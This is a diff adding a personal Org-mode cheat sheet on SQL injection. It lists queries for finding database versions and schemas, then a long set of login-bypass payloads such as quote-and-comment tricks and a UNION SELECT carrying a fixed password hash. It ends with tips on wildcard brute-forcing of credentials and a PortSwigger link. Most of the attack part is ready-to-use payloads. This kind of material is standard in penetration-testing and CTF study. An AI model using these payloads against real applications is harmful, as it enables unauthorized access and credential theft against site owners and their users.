@@ -1,0 +1,108 @@
+:PROPERTIES:
+:ID:       74bb259b-6f1b-492f-b4ac-3c55af2a93a7
+:END:
+#+title: SQLI Cheat Sheet
+
+* Database Agnostic
+* Database Specific
+** Type and Version
+*** MySQL and MSSQL
+#+begin_src SQL
+SELECT @@version
+#+end_src
+*** Oracle
+#+begin_src SQL
+SELECT * FROM v$version
+#+end_src
+*** PostgreSQL
+#+begin_src SQL
+SELECT version()
+#+end_src
+
+** Database information
+#+begin_src SQL
+SELECT * FROM information_schema.tables
+#+end_src
+
+*** MySQL and MSSQL and PostgreSQL
+- For tables:
+  #+begin_src
+SELECT * FROM information_schema.tables
+  #+end_src
+- For tables:
+  #+begin_src
+SELECT * FROM information_schema.columns WHERE table_name = 'table_name'
+  #+end_src
+*** Oracle
+- For tables:
+  #+begin_src
+SELECT * FROM all_tables
+  #+end_src
+- For tables:
+  #+begin_src
+SELECT * FROM all_tab_columns WHERE table_name = 'table_name'
+  #+end_src
+* Common Payloads
+A typical login query would be:
+#+begin_src sql
+SELECT * FROM users WHERE username='username' AND password='password'
+#+end_src
+
+We can exploit the above query using:
+#+begin_example
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+#+end_example
+
+* Tips and Tricks
+- We use ~OR 1=1~ to return all data in the table (always true).
+- The comment sequence ~--~ causes the remainder of the query to be ignored.
+- In sqlite3, we can use the keyword ~AS~ to give a column a temporary name, this helps when the query is fixed using a certain column name.
+- Some databases accept wildcards such as the asterisk ~*~ which matches all entries in a table. To find credentials in this case, we can write a script that appends ~*~ to the username/password and collect all characters that result in valid requests.
+
+* Resources
+- PortSwigger's SQL injection [[https://portswigger.net/web-security/sql-injection/cheat-sheet][cheat sheet]]
